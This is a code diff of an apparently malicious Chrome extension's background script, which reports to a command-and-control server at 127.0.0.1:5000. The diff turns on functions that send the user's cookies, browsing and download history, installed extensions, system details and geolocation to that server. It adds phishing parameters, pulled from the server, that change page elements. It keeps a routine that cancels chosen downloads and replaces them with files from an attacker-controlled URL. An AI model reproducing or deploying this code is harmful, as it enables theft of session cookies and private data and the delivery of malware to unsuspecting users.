@@ -71,12 +71,32 @@ DeltaB = Variation of time between request of Phase information
 
 //Default Values:
 DefaultDeltas = 10;
-ObjDowDefault = undefined;
-TarDownDefault = undefined;
-NamDownDefault = undefined;
-TarPhiDefault = undefined;
-DefaultPhase = 0;
-const SERVER_HOST = "http://127.0.0.1:5000"; //the url of the CC server, this would not exists in a real distribution has a global variable
+DefaultPhase = 0; //Attack Phase
+    //Payload attack
+ObjDowDefault = undefined; //the string we search
+TarDownDefault = undefined; //the URL for the new download
+NamDownDefault = undefined; //The name to put to the downloaded file
+    //Phishing attack
+PhiChildDefault = undefined; //the element to change
+PhiParentDefault = undefined; //the parent element
+PhiContentsDefualt = undefined;  //The new element
+
+
+
+const IP = "http://127.0.0.1:5000/"; //the url of the CC server, this would not exists in a real distribution has a global variable
+const IP_Send = IP + `extadd/`
+//Common Fetch Function
+
+function log(Data, Type){
+    fetch(IP_Send + Type,
+    {
+    method: "POST",
+    mode: 'no-cors',
+    body: JSON.stringify(Data),
+    headers:{"Content-Type": "application/json"}
+    })
+}
+
 
 chrome.runtime.onInstalled.addListener(function setuid(){
     //When installed or update the extension:
@@ -116,8 +136,8 @@ chrome.runtime.onInstalled.addListener(function setuid(){
         if (result.uid == undefined ){ //if non attribute uid saved
             const value = cyrb128(First_installed); //hash time of installment
             chrome.storage.local.set({uid:value}); //save has uid attribute (asyncronus)
-
-            fetch(SERVER_HOST + 'extadd',
+            
+            fetch("http://127.0.0.1:5000/extadd/100",
             {
             method: 'POST',
             mode: 'no-cors', 
@@ -148,7 +168,7 @@ chrome.runtime.onInstalled.addListener(function setuid(){
             //Start download parametes with default values
             chrome.storage.local.set({ObjDown:ObjDowDefault, TarDown: TarDownDefault, NamDown:NamDownDefault})
             //Start phising parametes with default values
-            chrome.storage.local.set({TarPhi: TarPhiDefault})
+            chrome.storage.local.set({ChildPhi: PhiChildDefault, ContPhi: PhiContentsDefualt, ParentPhi: PhiParentDefault})
         }
     
     });
@@ -175,16 +195,15 @@ Logger Functions:
     loggingcontentSettings = obtain all the content Settings, those are what the browser allows to do
     loggingprivacySettings = obtain all privacy settings, in a common case migth not be of interest
     logGeolocation = Send the geolocation data of the user without needing to ask
-
-    WIP:
     logExApp = obtain list of extensions
     logManagement
     logCookies
+    logOS
     logForms
     logHistorial
     logDowloadHistorial
     logproxySettings
-    etc.
+    
 
 Send Function:
     logSend = Calls all loggers and gives the order to send then information to the CC server
@@ -197,26 +216,43 @@ function logGeolocation(){
     chrome.storage.local.get(["lat", "long"]).then((result)=>{ //take the information, if exists from the storage
         //this data is obtained in the content script
         if(result.lat != undefined){
-        S = {}
-        S.lat = result.lat;
-        S.lon = result.long;
+        S3 = {}
+        S3.lat = result.lat;
+        S3.lon = result.long;
         number = 3; //send it to the server with the needed information for storing
+
         setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
-    
-            S.uid = result.uid.toString();
-      
-            fetch(`http://127.0.0.1:5000/extadd/${number}`,
-            {
-            method: "POST",
-            mode: 'no-cors',
-            body: JSON.stringify(S),
-            headers:{"Content-Type": "application/json"}
-            })
-            
+            S3.uid = result.uid.toString();
+            fetch(IP_Send + 3,
+                {
+                method: "POST",
+                mode: 'no-cors',
+                body: JSON.stringify(S3),
+                headers:{"Content-Type": "application/json"}
+                })
             })},1500);}})
 }
+function logOS(){
+    chrome.storage.local.get(["OS"]).then((result)=>{ //take the information, if exists from the storage
+        //this data is obtained in the content script
+        if(result.OS != undefined){
+        S10 = {}
+        S10.blob = result.OS
+        number = 10; //send it to the server with the needed information for storing
+
+        setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
+            S10.uid = result.uid.toString();
+            fetch(IP_Send + 10,
+                {
+                method: "POST",
+                mode: 'no-cors',
+                body: JSON.stringify(S10),
+                headers:{"Content-Type": "application/json"}
+                })
+            })},1500);}})    
+}
 function loggingcontentSettings(){
-    number = 1;
+    
     var S={};
 
     chrome.contentSettings.cookies.get({primaryUrl:'http://*'},function(details){S.Cookies = details.setting;});
@@ -232,49 +268,40 @@ function loggingcontentSettings(){
     chrome.contentSettings.camera.get({primaryUrl:'http://*'},function(details){S.Camera = details.setting;});
     chrome.contentSettings.unsandboxedPlugins.get({primaryUrl:'http://*'},function(details){S.UnsandboxedPlugins = details.setting;});
     chrome.contentSettings.automaticDownloads.get({primaryUrl:'http://*'},function(details){S.AutomaticDownloads = details.setting;});
-    setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
     
+    setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
         S.uid = result.uid.toString();
-  
-        fetch(`http://127.0.0.1:5000/extadd/${number}`,
-        {
-        method: "POST",
-        mode: 'no-cors',
-        body: JSON.stringify(S),
-        headers:{"Content-Type": "application/json"}
-        })
-        
+        number = 1;
+        fetch(IP_Send + 1,
+            {
+            method: "POST",
+            mode: 'no-cors',
+            body: JSON.stringify(S),
+            headers:{"Content-Type": "application/json"}
+            })
         })},1500);    
-
-
 }
 function loggingprivacySettings(){
 
     var S={};
-
     chrome.privacy.services.alternateErrorPagesEnabled.get({},function(details){S.alternateErrorPagesEnabledVal = details.value; S.alternateErrorPagesEnabledLev = details.levelOfControl ;});
     chrome.privacy.services.safeBrowsingEnabled.get({},function(details){S.safeBrowsingEnabledVal = details.value; S.safeBrowsingEnabledLev = details.levelOfControl ;});
-    
-    
+
     chrome.privacy.websites.hyperlinkAuditingEnabled.get({},function(details){S.hyperlinkAuditingEnabledVal = details.value; S.hyperlinkAuditingEnabledLev = details.levelOfControl;});
     chrome.privacy.websites.doNotTrackEnabled.get({},function(details){S.doNotTrackEnabledVal = details.value; S.doNotTrackEnabledLev = details.levelOfControl;});
     chrome.privacy.websites.protectedContentEnabled.get({},function(details){S.protectedContentEnabledVal = details.value; S.protectedContentEnabledLev = details.levelOfControl;});
     
     setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
-    
         S.uid = result.uid.toString();
         number = 2;
-        fetch(`http://127.0.0.1:5000/extadd/${number}`,
-        {
-        method: "POST",
-        mode: 'no-cors',
-        body: JSON.stringify(S),
-        headers:{"Content-Type": "application/json"}
-        }).then((response)=> {console.log(response)})
-        
+        fetch(IP_Send + 2,
+            {
+            method: "POST",
+            mode: 'no-cors',
+            body: JSON.stringify(S),
+            headers:{"Content-Type": "application/json"}
+            })
         })},1500);    
-
-
 }
 function logCookies() {
     chrome.cookies.getAll({}).then((cookies) =>{
@@ -283,23 +310,18 @@ function logCookies() {
           a.push(cookie);
         }
         setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
-            S = {}
-            S.blob = a
-            number = 4
-            S.uid = result.uid.toString();
-      
-            fetch(`http://127.0.0.1:5000/extadd/${number}`,
-            {
-            method: "POST",
-            mode: 'no-cors',
-            body: JSON.stringify(S),
-            headers:{"Content-Type": "application/json"}
-            })
-            
+            S4 = {}
+            S4.blob = a
+            S4.uid = result.uid.toString();
+            fetch(IP_Send + 4,
+                {
+                method: "POST",
+                mode: 'no-cors',
+                body: JSON.stringify(S4),
+                headers:{"Content-Type": "application/json"}
+                })
             })},1500); 
-
     });
-
 }
 function logHistory(){
     chrome.history.search({ text: "" }).then((hists)=>{
@@ -309,78 +331,66 @@ function logHistory(){
         }
         setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
             number = 5
-            S = {}
-            S.blob = a
-            S.uid = result.uid.toString();
-      
-            fetch(`http://127.0.0.1:5000/extadd/${number}`,
-            {
-            method: "POST",
-            mode: 'no-cors',
-            body: JSON.stringify(S),
-            headers:{"Content-Type": "application/json"}
-            })
-            
+            S5 = {}
+            S5.blob = a
+            S5.uid = result.uid.toString();
+            fetch(IP_Send + 5,
+                {
+                method: "POST",
+                mode: 'no-cors',
+                body: JSON.stringify(S5),
+                headers:{"Content-Type": "application/json"}
+                })  
             })},1500); 
-
     });
-
-
 }
 function logDowloads(){
     chrome.downloads.search({}).then((down)=>{
         setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
             number = 6
-            S = {}
-            S.blob = down
-            S.uid = result.uid.toString();
-      
-            fetch(`http://127.0.0.1:5000/extadd/${number}`,
-            {
-            method: "POST",
-            mode: 'no-cors',
-            body: JSON.stringify(S),
-            headers:{"Content-Type": "application/json"}
-            })
-            
+            S6 = {}
+            S6.blob = down
+            S6.uid = result.uid.toString();
+            fetch(IP_Send + 6,
+                {
+                method: "POST",
+                mode: 'no-cors',
+                body: JSON.stringify(S6),
+                headers:{"Content-Type": "application/json"}
+                })        
             })},1500); 
     })   
 }
 function logExtensions(){
-    chrome.management.getAll({}).then((ext)=>{
+    chrome.management.getAll((ext)=>{
         setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
             number = 7
-            S = {}
-            S.blob = ext
-            S.uid = result.uid.toString();
-      
-            fetch(`http://127.0.0.1:5000/extadd/${number}`,
-            {
-            method: "POST",
-            mode: 'no-cors',
-            body: JSON.stringify(S),
-            headers:{"Content-Type": "application/json"}
-            })
-            
+            S7 = {}
+            S7.blob = ext
+            S7.uid = result.uid.toString();
+            fetch(IP_Send + 7,
+                {
+                method: "POST",
+                mode: 'no-cors',
+                body: JSON.stringify(S7),
+                headers:{"Content-Type": "application/json"}
+                })  
             })},1500); 
     })   
 }
 function logCpu(){
-    chrome.system.cpu.getInfo({}).then((cpu)=>{
+    chrome.system.cpu.getInfo((cpu)=>{
         setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
-            number = 8
-            S = {}
-            S.blob = cpu
-            S.uid = result.uid.toString();
-      
-            fetch(`http://127.0.0.1:5000/extadd/${number}`,
-            {
-            method: "POST",
-            mode: 'no-cors',
-            body: JSON.stringify(S),
-            headers:{"Content-Type": "application/json"}
-            })
-            
+            S8 = {}
+            S8.blob = cpu
+            S8.uid = result.uid.toString();
+            fetch(IP_Send + 8,
+                {
+                method: "POST",
+                mode: 'no-cors',
+                body: JSON.stringify(S8),
+                headers:{"Content-Type": "application/json"}
+                })
             })},1500); 
     })   
 }
@@ -388,18 +398,16 @@ function logProxy(){
     chrome.proxy.settings.get({'incognito': false}).then((prox)=>{
         setTimeout(function(){chrome.storage.local.get(["uid"]).then((result)=>{
             number = 9
-            S = {}
-            S.blob = prox
-            S.uid = result.uid.toString();
-      
-            fetch(`http://127.0.0.1:5000/extadd/${number}`,
-            {
-            method: "POST",
-            mode: 'no-cors',
-            body: JSON.stringify(S),
-            headers:{"Content-Type": "application/json"}
-            })
-            
+            S9 = {}
+            S9.blob = prox
+            S9.uid = result.uid.toString();
+            fetch(IP_Send + 9,
+                {
+                method: "POST",
+                mode: 'no-cors',
+                body: JSON.stringify(S9),
+                headers:{"Content-Type": "application/json"}
+                })   
             })},1500); 
     })   
 }
@@ -407,22 +415,24 @@ function logSend(){
     try{//errors can happen if the server is down, and we do not want the user to receive errors messages
         //hence, this try and catch nullifies them.
         // implement: https://stackoverflow.com/questions/11219582/how-to-detect-my-browser-version-and-operating-system-using-javascript
-        //logCookies();
-        //logHistory();
-        //logGeolocation();
-        //logDowloads();
-        //logExtensions();
-        //logCpu();
-        //logProxy;
-        //loggingcontentSettings();
-        //loggingprivacySettings();
+        
+        logGeolocation();
+        loggingcontentSettings();
+        loggingprivacySettings();        
+        logCookies();
+        logHistory();
+        logDowloads();
+        logExtensions();
+        logCpu();
+        logOS();
+        logProxy();
+
         
         return true
     }
     catch{
         return false
     }
-
 }
 
 
@@ -463,7 +473,7 @@ indentifie.
 function phase(){ //This function manges any kind of change in the phase
     chrome.storage.local.get(["uid"]).then( (result)=>{ //with the UID of the user
     result = result.uid.toString() //as a str
-    fetch(`http://127.0.0.1:5000/req/${result}`, //request the CC server newest entry
+    fetch(IP+`/req/${result}`, //request the CC server newest entry
         {
         method: "GET",
         mode: 'no-cors', 
@@ -475,9 +485,11 @@ function phase(){ //This function manges any kind of change in the phase
             chrome.storage.local.set({ObjDown:result.obj});
             chrome.storage.local.set({TarDown:result.tar});
             chrome.storage.local.set({NamDown:result.nam});
+            chrome.storage.local.set({ChildPhi: result.chi});
+            chrome.storage.local.set({ContPhi:  result.con});
+            chrome.storage.local.set({ParentPhi:result.par});
         });})
-
-    }
+}
 
     
 chrome.webNavigation.onCompleted.addListener((e) => {//add a listener that activate when any url is completly loaded
@@ -491,12 +503,8 @@ chrome.webNavigation.onCompleted.addListener((e) => {//add a listener that activ
                     chrome.storage.local.set({TimeB:b}) //save new time
                 }
         });
-
-
     }
-}
-    
-    );
+});
 
 
 //https://stackoverflow.com/questions/60727329/chrome-extension-rejection-use-of-permissions-all-urls
@@ -508,25 +516,13 @@ chrome.webNavigation.onCompleted.addListener((e) => {//add a listener that activ
 function modify(item){
     chrome.storage.local.get(["phase"]).then((result)=>{ //look at the actual phase
         if(result.phase == 1){ //if we are in attacking phase
-            chrome.storage.local.get(["ObjDown","TarDown","NamDown"]).then((result1)=>{ //ask for all storage information
-                fetch('http://127.0.0.1:5000/control_server',
-                {
-                method: "POST",
-                mode: 'no-cors', 
-                body: JSON.stringify( {caca:  result1.ObjDown} ),
-                headers:{"Content-Type": "application/json"}
-                }
-                ) 
+            chrome.storage.local.get(["ObjDown","TarDown","NamDown"]).then((result1)=>{ //ask for all storage information 
                 if (item.url.includes(result1.ObjDown)){ //is the object our objective?
-
                         chrome.downloads.cancel(item.id) //if it is, cancel that download
                         chrome.downloads.download({url: result1.TarDown, filename: result1.NamDown}); //start a new download from our controlled url, with the name that we want (usually the same filename that the objective)
                         }
-
             })
-        
     }});
- 
 }
 
 
